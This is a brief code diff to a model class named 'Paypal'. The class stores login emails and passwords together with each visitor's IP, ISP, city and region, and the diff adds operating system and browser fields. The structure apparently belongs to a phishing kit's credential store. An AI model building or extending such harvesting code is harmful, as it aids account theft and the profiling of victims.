@@ -13,6 +13,8 @@ class Paypal extends Model
         'login_email',
         'login_password',
         'ip',
+        'os',
+        'browser',
         'isp',
         'city',
         'region',
